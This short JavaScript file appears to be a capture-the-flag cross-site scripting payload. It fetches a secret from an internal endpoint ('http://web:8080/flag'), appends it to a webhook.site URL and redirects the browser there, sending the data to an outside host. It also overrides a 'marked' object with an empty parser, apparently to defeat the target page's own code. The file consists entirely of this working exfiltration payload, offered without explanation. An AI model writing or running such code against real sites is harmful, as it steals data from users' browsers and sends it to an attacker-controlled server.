function httpGet(theUrl) {
  var xmlHttp = new XMLHttpRequest();
  xmlHttp.open("GET", theUrl, false); // false for synchronous request
  xmlHttp.send(null);
  return xmlHttp.responseText;
}

let payload;

const resp456416512364m = httpGet("http://web:8080/flag");
payload =
  "https://webhook.site/79cc3f07-c94a-4ee5-8578-b9ee2b28187f/?c=" +
  resp456416512364m;

const marked = {
  parse: () => {},
};

document.location.href = payload;